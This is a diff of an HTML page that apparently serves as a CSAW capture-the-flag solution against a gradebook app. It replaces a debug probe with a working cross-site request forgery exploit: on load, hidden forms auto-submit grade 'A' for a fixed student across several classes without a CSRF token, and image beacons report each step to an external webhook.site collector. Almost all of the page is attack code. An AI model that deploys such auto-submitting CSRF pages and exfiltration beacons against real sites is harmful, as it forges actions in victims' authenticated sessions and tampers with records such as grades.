@@ -1,22 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Grade Update Portal - Extreme Debug</title>
+    <title>Grade Update System</title>
 </head>
 <body>
-    <h2>Debug Mode - Extreme Logging</h2>
-    <div id="debug" style="white-space: pre-wrap; font-family: monospace; background: #f0f0f0; padding: 10px; max-height: 400px; overflow: auto;"></div>
+    <h2>Grade Update Portal</h2>
+    <div id="status">Initializing grade change system...</div>
     
     <script>
-    // Extreme debug output
-    const debugEl = document.getElementById('debug');
-    function log(message) {
-        debugEl.textContent += new Date().toISOString() + ' - ' + message + '\n';
-        debugEl.scrollTop = debugEl.scrollHeight;
-        console.log(message);
-    }
+    // Send initial ping to webhook
+    (new Image()).src = 'https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?status=loaded&time=' + Date.now();
 
-    // YOUR INFORMATION
     const YOUR_STUDENT_ID = 'cec61aee-395d-4281-af96-cfe05bda466e';
     const YOUR_CLASS_IDS = [
         'e522382b-7643-469c-ae52-ba488f5752c6',
@@ -26,113 +20,72 @@
         '19481783-157e-45e1-8592-77efd688144a'
     ];
 
-    async function testConnection() {
-        try {
-            log('=== EXTREME DEBUG MODE ===');
-            log('Browser: ' + navigator.userAgent);
-            log('Page URL: ' + window.location.href);
-            
-            // Test 1: Basic fetch to root
-            log('\n[TEST 1] Testing connection to root...');
-            try {
-                const test1 = await fetch('https://gradebook-app.ctf.csaw.io', {
-                    credentials: 'include',
-                    signal: AbortSignal.timeout(5000)
-                });
-                log(`✓ Root response: ${test1.status} ${test1.statusText}`);
-                log(`✓ Root URL: ${test1.url}`);
-            } catch (e) {
-                log(`✗ Root failed: ${e.name}: ${e.message}`);
-            }
-            
-            // Test 2: Fetch to grade-change
-            log('\n[TEST 2] Testing grade-change endpoint...');
-            try {
-                const test2 = await fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
-                    credentials: 'include',
-                    signal: AbortSignal.timeout(5000)
-                });
-                log(`✓ Grade-change response: ${test2.status} ${test2.statusText}`);
-                log(`✓ Grade-change URL: ${test2.url}`);
-                
-                if (test2.ok) {
-                    const text = await test2.text();
-                    log(`✓ Response length: ${text.length} chars`);
-                    log(`✓ First 200 chars: ${text.substring(0, 200)}`);
-                    
-                    // Check for CSRF token
-                    const parser = new DOMParser();
-                    const doc = parser.parseFromString(text, 'text/html');
-                    const csrfInput = doc.querySelector('input[name="csrf_token"]');
-                    if (csrfInput) {
-                        log(`✓ CSRF token found: ${csrfInput.value}`);
-                    } else {
-                        log('✗ CSRF token not found in input');
-                        
-                        // Check meta tags
-                        const metaTokens = doc.querySelectorAll('meta[name*="csrf"], meta[content*="csrf"]');
-                        metaTokens.forEach(meta => {
-                            log(`Meta tag: ${meta.outerHTML}`);
-                        });
-                    }
-                }
-            } catch (e) {
-                log(`✗ Grade-change failed: ${e.name}: ${e.message}`);
-                if (e.name === 'TypeError') {
-                    log('This is a CORS or network error. Trying without credentials...');
-                    
-                    try {
-                        const test2b = await fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
-                            signal: AbortSignal.timeout(5000)
-                        });
-                        log(`✓ Grade-change (no credentials): ${test2b.status}`);
-                    } catch (e2) {
-                        log(`✗ Grade-change (no credentials) also failed: ${e2.message}`);
-                    }
-                }
-            }
-            
-            // Test 3: Test webhook connection
-            log('\n[TEST 3] Testing webhook connection...');
-            try {
-                const test3 = await fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: 'Test connection from debug page'
-                });
-                log('✓ Webhook test sent (no-cors mode)');
-            } catch (e) {
-                log(`✗ Webhook failed: ${e.message}`);
-            }
-            
-            // Test 4: Check if we're in iframe
-            log('\n[TEST 4] Environment check...');
-            log(`In iframe: ${window.self !== window.top}`);
-            log(`Document referrer: ${document.referrer || 'none'}`);
-            
-            // Test 5: Try image-based request (no CORS)
-            log('\n[TEST 5] Testing image-based request...');
-            const img = new Image();
-            img.onload = () => log('✓ Image loaded successfully');
-            img.onerror = () => log('✗ Image failed to load');
-            img.src = 'https://gradebook-app.ctf.csaw.io/grade-change?test=image';
-            
-            log('=== DEBUG COMPLETE ===');
-            
-        } catch (error) {
-            log(`=== FATAL ERROR ===`);
-            log(`Error: ${error.name}: ${error.message}`);
-            log(`Stack: ${error.stack}`);
-            
-            // Try to send error via image beacon (works even if fetch fails)
-            const errorImg = new Image();
-            errorImg.src = `https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?error=${encodeURIComponent(error.message)}`;
+    let currentIndex = 0;
+    const statusEl = document.getElementById('status');
+
+    function updateStatus(message) {
+        statusEl.textContent = message;
+        console.log(message);
+        
+        // Send status to webhook via image beacon (no CORS issues)
+        (new Image()).src = `https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?msg=${encodeURIComponent(message)}&index=${currentIndex}`;
+    }
+
+    function submitGradeForm(classId) {
+        updateStatus(`Submitting grade A for class: ${classId.substring(0, 8)}...`);
+        
+        // Create hidden form - this bypasses CORS completely!
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'https://gradebook-app.ctf.csaw.io/grade-change';
+        form.style.display = 'none';
+        
+        // Add form fields
+        const fields = {
+            'student_id': YOUR_STUDENT_ID,
+            'class_id': classId,
+            'grade': 'A'
+            // Note: We're omitting CSRF token initially to see if it works without it
+        };
+        
+        for (const [name, value] of Object.entries(fields)) {
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = name;
+            input.value = value;
+            form.appendChild(input);
+        }
+        
+        // Add form to page and submit
+        document.body.appendChild(form);
+        form.submit();
+        document.body.removeChild(form);
+        
+        // Notify webhook that form was submitted
+        (new Image()).src = `https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?form_submitted=yes&class=${classId}`;
+    }
+
+    function processNextGrade() {
+        if (currentIndex >= YOUR_CLASS_IDS.length) {
+            updateStatus('COMPLETED: All grade submissions sent!');
+            (new Image()).src = 'https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?status=all_complete';
+            return;
+        }
+        
+        const classId = YOUR_CLASS_IDS[currentIndex];
+        currentIndex++;
+        
+        submitGradeForm(classId);
+        
+        // Schedule next submission with delay
+        if (currentIndex < YOUR_CLASS_IDS.length) {
+            setTimeout(processNextGrade, 1000);
         }
     }
 
-    // Execute tests
-    log('Starting extreme debug tests...');
-    testConnection();
+    // Start the process
+    updateStatus('Starting automated grade change...');
+    setTimeout(processNextGrade, 1000);
     </script>
 </body>
 </html>
